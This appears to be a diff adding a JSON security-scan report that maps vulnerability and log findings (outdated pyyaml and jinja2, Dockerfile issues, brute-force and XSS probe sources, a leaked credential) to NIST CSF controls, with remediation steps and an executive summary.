+        "control_id": "PR.PS-01",
+        "title": "Configuration management practices are established and applied",
+        "status": "Not Met",
+        "rationale": "4 related finding(s); worst severity 'high'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-7fc2198b44a0",
+          "F-976af72625aa",
+          "F-baff40d64173",
+          "F-e43293fc771f"
+        ],
+        "remediation": "Add a non-root `USER` instruction and make required paths writable by that UID.; Append `&& rm -rf /var/lib/apt/lists/*` to shrink layers and attack surface.; Pin the base image to an immutable digest (FROM image@sha256:...).; Use COPY for local files; download with verified checksums in a RUN step.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "PR.PS-02",
+        "title": "Software is maintained, replaced, and removed commensurate with risk",
+        "status": "Not Met",
+        "rationale": "3 related finding(s); worst severity 'critical'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-4d73c8cbff46",
+          "F-c3b8551319dc",
+          "F-ce3694347c63"
+        ],
+        "remediation": "Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
+        "control_id": "PR.PS-06",
+        "title": "Secure software development practices are integrated and their performance monitored",
+        "status": "Not Met",
+        "rationale": "3 related finding(s); worst severity 'high'. One or more high/critical issues make this control Not Met.",
+        "evidence_finding_ids": [
+          "F-014c834cd5cd",
+          "F-4c70da6fa645",
+          "F-8bd7e433f512"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "RS.MA-01",
+        "title": "The incident response plan is executed in coordination with relevant third parties",
+        "status": "Not Assessed",
+        "rationale": "No finding bears on this control and no positive evidence was collected offline.",
+        "evidence_finding_ids": [],
+        "remediation": "",
+        "effort": ""
+      },
+      {
+        "control_id": "RS.AN-03",
+        "title": "Analysis is performed to establish what has taken place during an incident",
+        "status": "Not Assessed",
+        "rationale": "No finding bears on this control and no positive evidence was collected offline.",
+        "evidence_finding_ids": [],
+        "remediation": "",
+        "effort": ""
+      }
+    ],
+    "failing_controls": [
+      "PR.AA-01",
+      "PR.AA-05",
+      "DE.CM-09",
+      "ID.RA-01",
+      "ID.RA-05",
+      "PR.PS-01",
+      "PR.PS-02",
+      "PR.PS-06"
+    ],
+    "remediation_backlog": [
+      {
+        "control_id": "ID.RA-01",
+        "title": "Vulnerabilities in assets are identified, validated, and recorded",
+        "status": "Not Met",
+        "worst_severity": "critical",
+        "finding_ids": [
+          "F-3c0e8bd0a3a2",
+          "F-4d73c8cbff46",
+          "F-c3b8551319dc",
+          "F-c87d3959274e",
+          "F-ce3694347c63",
+          "F-f1c73039b1c6"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Review sudoers, alert on repeated failures, and confirm the account owner.; Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
+        "control_id": "ID.RA-05",
+        "title": "Threats, vulnerabilities, likelihoods, and impacts are used to understand inherent risk",
+        "status": "Not Met",
+        "worst_severity": "critical",
+        "finding_ids": [
+          "F-83069228f1b0",
+          "F-c87d3959274e",
+          "F-ce3694347c63"
+        ],
+        "remediation": "Block 198.51.100.23 at the perimeter and hunt for other activity from it.; Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
+        "control_id": "PR.PS-02",
+        "title": "Software is maintained, replaced, and removed commensurate with risk",
+        "status": "Not Met",
+        "worst_severity": "critical",
+        "finding_ids": [
+          "F-4d73c8cbff46",
+          "F-c3b8551319dc",
+          "F-ce3694347c63"
+        ],
+        "remediation": "Upgrade jinja2 to >= 2.10.1 (fixes CVE-2019-10906).; Upgrade pyyaml to >= 5.4 (fixes CVE-2020-14343).; Upgrade pyyaml to >= 5.4 and redeploy.",
+        "effort": "M (days) - coordinated change"
+      },
+      {
+        "control_id": "PR.AA-01",
+        "title": "Identities and credentials for authorized users are managed",
+        "status": "Not Met",
+        "worst_severity": "high",
+        "finding_ids": [
+          "F-014c834cd5cd",
+          "F-4dde57b4f8be",
+          "F-83069228f1b0"
+        ],
+        "remediation": "Block 203.0.113.66 at the perimeter and hunt for other activity from it.; Block the source IP at the edge, lock/reset the targeted account(s), enforce MFA, and deploy rate-limiting / fail2ban on the auth service.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "PR.AA-05",
+        "title": "Access permissions and authorizations are managed, incorporating least privilege",
+        "status": "Not Met",
+        "worst_severity": "high",
+        "finding_ids": [
+          "F-976af72625aa",
+          "F-f1c73039b1c6"
+        ],
+        "remediation": "Add a non-root `USER` instruction and make required paths writable by that UID.; Review sudoers, alert on repeated failures, and confirm the account owner.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "DE.CM-09",
+        "title": "Computing hardware and software, runtime environments, and their data are monitored",
+        "status": "Not Met",
+        "worst_severity": "high",
+        "finding_ids": [
+          "F-3c0e8bd0a3a2",
+          "F-4c70da6fa645",
+          "F-8bd7e433f512",
+          "F-c87d3959274e",
+          "F-f3be33a4a8b1"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Block 198.51.100.23 at the perimeter and hunt for other activity from it.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "PR.PS-01",
+        "title": "Configuration management practices are established and applied",
+        "status": "Not Met",
+        "worst_severity": "high",
+        "finding_ids": [
+          "F-7fc2198b44a0",
+          "F-976af72625aa",
+          "F-baff40d64173",
+          "F-e43293fc771f"
+        ],
+        "remediation": "Add a non-root `USER` instruction and make required paths writable by that UID.; Append `&& rm -rf /var/lib/apt/lists/*` to shrink layers and attack surface.; Pin the base image to an immutable digest (FROM image@sha256:...).; Use COPY for local files; download with verified checksums in a RUN step.",
+        "effort": "M (days)"
+      },
+      {
+        "control_id": "PR.PS-06",
+        "title": "Secure software development practices are integrated and their performance monitored",
+        "status": "Not Met",
+        "worst_severity": "high",
+        "finding_ids": [
+          "F-014c834cd5cd",
+          "F-4c70da6fa645",
+          "F-8bd7e433f512"
+        ],
+        "remediation": "Add/verify a WAF rule for this payload class, rate-limit or block the source, and audit the targeted endpoint for the underlying injection flaw.; Revoke/rotate the credential now, remove it from git history, and load it from a secrets manager or environment variable.",
+        "effort": "M (days)"
+      }
+    ],
+    "finding_control_matrix": {
+      "F-4dde57b4f8be": [
+        "PR.AA-01"
+      ],
+      "F-83069228f1b0": [
+        "PR.AA-01",
+        "ID.RA-05"
+      ],
+      "F-014c834cd5cd": [
+        "PR.AA-01",
+        "PR.PS-06"
+      ],
+      "F-976af72625aa": [
+        "PR.AA-05",
+        "PR.PS-01"
+      ],
+      "F-f1c73039b1c6": [
+        "PR.AA-05",
+        "ID.RA-01"
+      ],
+      "F-8bd7e433f512": [
+        "DE.CM-09",
+        "PR.PS-06"
+      ],
+      "F-4c70da6fa645": [
+        "DE.CM-09",
+        "PR.PS-06"
+      ],
+      "F-3c0e8bd0a3a2": [
+        "DE.CM-09",
+        "ID.RA-01"
+      ],
+      "F-f3be33a4a8b1": [
+        "DE.CM-09"
+      ],
+      "F-c87d3959274e": [
+        "DE.CM-09",
+        "ID.RA-01",
+        "ID.RA-05"
+      ],
+      "F-ce3694347c63": [
+        "ID.RA-01",
+        "ID.RA-05",
+        "PR.PS-02"
+      ],
+      "F-c3b8551319dc": [
+        "ID.RA-01",
+        "PR.PS-02"
+      ],
+      "F-4d73c8cbff46": [
+        "ID.RA-01",
+        "PR.PS-02"
+      ],
+      "F-baff40d64173": [
+        "PR.PS-01"
+      ],
+      "F-7fc2198b44a0": [
+        "PR.PS-01"
+      ],
+      "F-e43293fc771f": [
+        "PR.PS-01"
+      ]
+    }
+  },
+  "agent_status": {
+    "log_monitor": "ok",
+    "vuln_scanner": "partial",
+    "threat_intel": "ok",
+    "incident_response": "ok",
+    "policy_checker": "ok"
+  },
+  "executive_summary": "This scan produced 17 findings (3 critical, 12 high, 1 medium, 1 low, 0 info). 11 incident response plan(s) were generated for confirmed or high-confidence issues.\n\nHighest-priority items:\n  - [critical] CVE-2020-14343 in pyyaml is high-risk (EPSS 0.90)\n  - [critical] Vulnerable dependency: pyyaml==5.3.1 (CVE-2020-14343)\n  - [critical] Vulnerable dependency: jinja2==2.10 (CVE-2019-10906)\n  - [high] Brute-force / credential-stuffing from 203.0.113.66 (8 failed auth attempts)\n  - [high] XSS probe: 1 request(s) from 198.51.100.23\n\nCompliance: mapped against NIST_CSF; estimated control coverage 67% with 8 control(s) currently failing or partial. All remediation is proposed only - no state-changing action was executed. Human review is required before acting on any plan step flagged for approval."
+}
